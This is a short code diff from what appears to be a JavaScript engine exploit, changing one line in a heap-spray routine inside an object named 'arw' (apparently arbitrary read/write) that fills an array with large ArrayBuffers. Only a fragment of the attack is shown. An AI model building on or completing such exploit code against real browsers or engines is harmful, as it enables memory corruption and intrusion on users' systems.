@@ -110,7 +110,7 @@ const arw = {
         const spray = new Array(crafted.length - 3);
 
         let i = 0;
-        spray[i++] = 1n;
+        spray[i++] = BigInt(1);
         spray[i++] = new ArrayBuffer(0x400000);
         spray[i++] = new ArrayBuffer(0x400000);
         for (; i < spray.length; i++) {
